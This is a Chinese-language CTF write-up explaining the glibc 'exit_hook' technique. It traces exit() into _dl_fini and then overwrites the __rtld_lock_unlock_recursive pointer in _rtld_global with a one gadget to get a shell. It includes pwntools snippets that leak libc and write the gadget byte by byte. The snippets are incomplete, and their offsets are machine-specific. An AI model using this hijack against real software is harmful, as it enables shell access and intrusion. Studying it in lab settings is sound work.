分析

首先我们先写一个调试的程序test.c，看一下exit流程是怎么走的

#include<stdio.h>
void main(){  printf("Hello exit_hook\n");  exit(0);}

之后我们用gcc编译出来

gcc -o test test.c

gdb进行动态调试，在我们exit(0)出打上断点

之后我们跟进去看看

这里可以清晰的看到调用了__run_exit_handlers函数，我们跟进去看看它调用了什么函数

可以发现这里调用了_dl_fini，下面是_dl_fini源码：

#ifdef SHARED  int do_audit = 0; again:#endif  for (Lmid_t ns = GL(dl_nns) - 1; ns >= 0; --ns)    {      /* Protect against concurrent loads and unloads.  */      __rtld_lock_lock_recursive (GL(dl_load_lock));
      unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;      /* No need to do anything for empty namespaces or those used for   auditing DSOs.  */      if (nloaded == 0#ifdef SHARED    || GL(dl_ns)[ns]._ns_loaded->l_auditing != do_audit#endif    )  __rtld_lock_unlock_recursive (GL(dl_load_lock));

这里调用了两个比较关键的函数

__rtld_lock_lock_recursive

__rtld_lock_unlock_recursive

在_rtld_global中发现这两个关键函数

此时exit()中执行流为

exit()->__run_exit_handlers->_dl_fini->__rtld_lock_unlock_recursive

只要我们将这两个中的其中一个劫持到one gadget，我们就可以getshell。注意这里不通的libc,_rtld_lock 结构体与libc base的偏移是不一样的。这里以我本机的libc为例去计算偏移

这里我们libc base与 _rtld_global结构体的偏移为0x61b060，但是我在查阅资料时，发现偏移并不一致，导致后面反复调试还是打不通

例题

接下来我们看例题，检查一下程序

64位程序，除了canary没开启，其他全部开启，我们放进ida里分析

程序开始运行，会给我们sleep地址，我们可以利用给我们的sleep地址算出libc基地址

io.recvuntil("here is a gift 0x")leak = int(io.recv(12),16)libc_base = leak - libc.sym['sleep']exit_hook = libc_base + 0x61b060 + 3840success(hex(leak))success(hex(libc_base))success(hex(exit_hook))

之后是一个for循环，第一个read让我们写入buf地址，第二次read第一个字节，一共五次。所以，我们有五次在任意地址写一个字符

for i in range(5):  io.send(p64(exit_hook+i))    io.send(p64(shell)[i])
